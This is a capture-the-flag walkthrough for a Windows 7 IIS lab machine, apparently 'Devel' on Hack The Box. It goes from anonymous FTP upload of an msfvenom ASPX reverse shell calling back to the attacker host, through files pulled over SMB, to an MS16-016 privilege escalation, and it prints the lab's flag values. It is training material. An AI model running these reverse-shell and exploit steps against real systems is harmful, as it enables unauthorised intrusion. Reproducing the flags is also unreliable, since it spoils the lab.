![image](https://user-images.githubusercontent.com/105310322/188014554-75a00454-e223-42b7-a37c-ef5753e187b5.png)

### Tools: Nmap, msfvenom

### Vulnerabilities: FTP, Unpatched system

Nmap reveals ftp and http are open. The http does not have much going on and gobuster didn't return anything potential.

However nmap says that ftp allows for anonymous logon.

```console
└──╼ [★]$ sudo nmap -p- -sS -sC -sV 10.129.51.128
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-01 18:02 BST
Nmap scan report for 10.129.51.128
Host is up (0.026s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 175.43 seconds
```
We confirm that we can login and look around but there isn't much except that its running aspnet. This leads me to believe that I can upload a reverse shell.

```console
└──╼ [★]$ ftp 10.129.51.128
Connected to 10.129.51.128.
220 Microsoft FTP Service
Name (10.129.51.128:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp>
```
Craft a quick reverse shell using msfvenom.

```console
└──╼ [★]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.41 lport=1234 -f aspx -o exploit.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2747 bytes
Saved as: exploit.aspx
```
Now we can try and upload it to FTP and it works!

```console
└──╼ [★]$ ftp 10.129.51.128
Connected to 10.129.51.128.
220 Microsoft FTP Service
Name (10.129.51.128:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put exploit.aspx
local: exploit.aspx remote: exploit.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2782 bytes sent in 0.00 secs (50.0589 MB/s)
ftp> 
```
Set up a listener and navigate to the file from the webpage ```http://10.129.51.128/exploit.aspx``` and boom we get our shell!

Right now we still have no power and can not even get the user flag.

I tried abusing some of the priviliges but to no avail. However running a 

```console
└──╼ [★]$ nc -lvnp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.129.51.128.
Ncat: Connection from 10.129.51.128:49158.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>
```

This shows that there is really nothing patched on here so we likely have an easy exploit. So lets run winPEAS and see what it finds for kernel exploits.

```console
c:\Users>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          1/9/2022, 8:01:34 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.413 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.507 MB
Virtual Memory: In Use:    634 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 4
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.51.128
                                 [02]: fe80::4c79:e05b:357d:e81f
                                 [03]: dead:beef::996e:f209:4b2:108b
                                 [04]: dead:beef::4c79:e05b:357d:e81f

```
Download winPEAS.bat from https://github.com/carlospolop/PEASS-ng/releases and set up the server to transfer.

Note: The other winPEAS.exe files did not work. the bat file works but it doesnt have the color indicators.

```console
└──╼ [★]$ sudo impacket-smbserver rogue . 
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```
Copy it to the victim computer

```console
c:\temp>copy \\10.10.14.41\rogue\winPEAS.bat
copy \\10.10.14.41\rogue\winPEAS.bat
        1 file(s) copied.
```
Running winPEAS reveals a bunch of kernel exploits. I tried a few before settling on MS016-16.

```console
"Microsoft Windows 7 Enterprise   " 
   [i] Possible exploits (https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)
No Instance(s) Available.
MS11-080 patch is NOT installed XP/SP3,2K3/SP3-afd.sys)
No Instance(s) Available.
MS16-032 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-secondary logon)
No Instance(s) Available.
MS11-011 patch is NOT installed XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP1/2,7/SP0-WmiTraceMessageVa)
No Instance(s) Available.
MS10-59 patch is NOT installed 2K8,Vista,7/SP0-Chimichurri)
No Instance(s) Available.
MS10-21 patch is NOT installed 2K/SP4,XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP0/1/2,7/SP0-Win Kernel)
No Instance(s) Available.
MS10-092 patch is NOT installed 2K8/SP0/1/2,Vista/SP1/2,7/SP0-Task Sched)
No Instance(s) Available.
MS10-073 patch is NOT installed XP/SP2/3,2K3/SP2/2K8/SP2,Vista/SP1/2,7/SP0-Keyboard Layout)
No Instance(s) Available.
MS17-017 patch is NOT installed 2K8/SP2,Vista/SP2,7/SP1-Registry Hive Loading)
No Instance(s) Available.
MS10-015 patch is NOT installed 2K,XP,2K3,2K8,Vista,7-User Mode to Ring)
No Instance(s) Available.
MS08-025 patch is NOT installed 2K/SP4,XP/SP2,2K3/SP1/2,2K8/SP0,Vista/SP0/1-win32k.sys)
No Instance(s) Available.
MS06-049 patch is NOT installed 2K/SP4-ZwQuerySysInfo)
No Instance(s) Available.
MS06-030 patch is NOT installed 2K,XP/SP2-Mrxsmb.sys)
No Instance(s) Available.
MS05-055 patch is NOT installed 2K/SP4-APC Data-Free)
No Instance(s) Available.
MS05-018 patch is NOT installed 2K/SP3/4,XP/SP1/2-CSRSS)
No Instance(s) Available.
MS04-019 patch is NOT installed 2K/SP2/3/4-Utility Manager)
No Instance(s) Available.
MS04-011 patch is NOT installed 2K/SP2/3/4,XP/SP0/1-LSASS service BoF)
No Instance(s) Available.
MS04-020 patch is NOT installed 2K/SP4-POSIX)
No Instance(s) Available.
MS14-040 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-afd.sys Dangling Pointer)
No Instance(s) Available.
MS16-016 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-WebDAV to Address)
No Instance(s) Available.
MS15-051 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-win32k.sys)
No Instance(s) Available.
MS14-070 patch is NOT installed 2K3/SP2-TCP/IP)
No Instance(s) Available.
MS13-005 patch is NOT installed Vista,7,8,2008,2008R2,2012,RT-hwnd_broadcast)
No Instance(s) Available.
MS13-053 patch is NOT installed 7SP0/SP1_x86-schlamperei)
No Instance(s) Available.
MS13-081 patch is NOT installed 7SP0/SP1_x86-track_popup_menu)
```
Using the exploit from https://www.exploit-db.com/exploits/39788 and following links will get us 2 files to download and transfer.

Set up the file server again and copy it to the victim.

```console
└──╼ [★]$ sudo impacket-smbserver rogue . 
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

```console
c:\temp>copy \\10.10.14.41\rogue\EoP.exe
copy \\10.10.14.41\rogue\EoP.exe
        1 file(s) copied.

c:\temp>copy \\10.10.14.41\rogue\Shellcode.dll
copy \\10.10.14.41\rogue\Shellcode.dll
        1 file(s) copied.
```
Run EoP.exe and we get system!

```console
c:\temp>Eop.exe
Eop.exe
[*] LoadAndGetKernelBase result = 0
[*] NtAllocateVirtualMemory result = SUCCESS, addr = 0, size = 20480
[*] Creating fake DeviceObject, DriverObject, etc structures...
[*] Starting fake webdav server...
[*] Calling WNetAddConnection2...
[*] Request: OPTIONS / HTTP/1.1
[*] Request: OPTIONS /folder HTTP/1.1
[*] Request: PROPFIND /folder HTTP/1.1
[*] Request: PROPFIND /folder HTTP/1.1
[*] WNetAddConnection2 = 0
[*] Request: PROPFIND /folder/file HTTP/1.1
[*] CreateFile result = 936
[*] NtFsControlFile result = 1337
[+] Got System? [+]
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\temp>whoami
whoami
nt authority\system
```
Navigate and cap the flags!

```console
c:\Users\babis\Desktop>type user.txt
type user.txt
966e18842873faf5d490df3e3d0cd0dd
```

```console
c:\Users\Administrator\Desktop>type root.txt
type root.txt
47833225dc5a52f1a60343e17b6f7770

c:\Users\Administrator\Desktop>
```

Congratulations!
